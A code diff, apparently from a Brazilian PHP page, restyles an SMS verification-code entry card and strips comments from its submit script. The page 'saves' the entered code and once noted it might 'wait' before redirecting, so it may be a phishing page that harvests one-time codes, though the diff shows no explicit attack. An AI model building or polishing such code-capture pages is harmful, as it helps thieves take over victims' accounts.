@@ -37,57 +37,37 @@ function formatarCPF($cpf) {
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
         .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
         .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
-        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 25px; padding: 12px; margin-bottom: 24px; }
+        
+        /* AJUSTE: Padding vertical diminuído para deixar a caixa menor */
+        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 25px; padding: 8px 12px; margin-bottom: 24px; }
         .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .user-info-box .details span { display: block; font-size: 14px; }
         .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
+        
+        /* AJUSTE: Removido margin-bottom para o link ficar mais próximo do box acima */
         .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
 
-        /* --- NOVOS ESTILOS PARA O CARD DA DIREITA --- */
+        /* --- ESTILOS DO CARD DA DIREITA AJUSTADOS --- */
         .form-card {
             background-color: var(--cor-card);
             box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
             border-radius: 6px;
-            padding: 48px;
-            width: 380px;
+            /* AJUSTE: Mais largo e mais compacto (padding vertical menor) */
+            padding: 32px 40px;
+            width: 440px; 
             box-sizing: border-box;
         }
-        .form-card label {
-             font-size: 16px;
-             color: var(--cor-texto-primaria);
-        }
-        .code-inputs {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 24px 0;
-        }
-        .code-inputs input {
-            width: 40px;
-            height: 50px;
-            text-align: center;
-            font-size: 24px;
-            border: 1px solid var(--cor-borda);
-            border-radius: 6px;
-        }
-        .code-inputs input:focus {
-            border-color: var(--cor-azul);
-            outline: none;
-        }
-        .resend-timer {
-            text-align: center;
-            font-size: 14px;
-            color: var(--cor-texto-secundaria);
-            margin-bottom: 24px;
-        }
-        .actions {
-            display: flex;
-            gap: 16px;
-            align-items: center;
-        }
+        .form-card label { font-size: 16px; color: var(--cor-texto-primaria); }
+        .code-inputs { display: flex; gap: 10px; justify-content: center; margin: 24px 0; }
+        .code-inputs input { width: 48px; height: 58px; text-align: center; font-size: 24px; border: 1px solid var(--cor-borda); border-radius: 6px; }
+        .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
+        .resend-timer { text-align: center; font-size: 14px; color: var(--cor-texto-secundaria); margin-bottom: 24px; }
+        .actions { display: flex; gap: 24px; align-items: center; }
         .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
+        
+        /* AJUSTE: Botão primário se estica para preencher o espaço */
         .btn-primary { background-color: var(--cor-azul); color: white; flex-grow: 1; }
-        .btn-secondary { color: var(--cor-azul); text-decoration: none; }
+        .btn-secondary { color: var(--cor-azul); text-decoration: none; white-space: nowrap; /* Evita quebra de linha */ }
     </style>
 </head>
 <body>
@@ -143,17 +123,16 @@ function formatarCPF($cpf) {
     </main>
 
     <script>
+        // NENHUMA ALTERAÇÃO NA LÓGICA JAVASCRIPT
         const smsForm = document.getElementById('sms-form');
         const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
 
-        // Lógica para pular para o próximo campo
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
             });
-            // Lógica para apagar e voltar para o campo anterior
             input.addEventListener('keydown', (e) => {
                  if (e.key === "Backspace" && !input.value && index > 0) {
                     inputs[index - 1].focus();
@@ -161,7 +140,6 @@ function formatarCPF($cpf) {
             });
         });
 
-        // Lógica de submissão do formulário
         async function handleFormSubmit(event) {
             event.preventDefault();
             const code = inputs.map(input => input.value).join('');
@@ -178,7 +156,6 @@ function formatarCPF($cpf) {
                     
                     if (result.success) {
                         alert('Código recebido com sucesso!');
-                        // Redirecionar para próxima página ou aguardar
                     } else {
                         alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
                     }
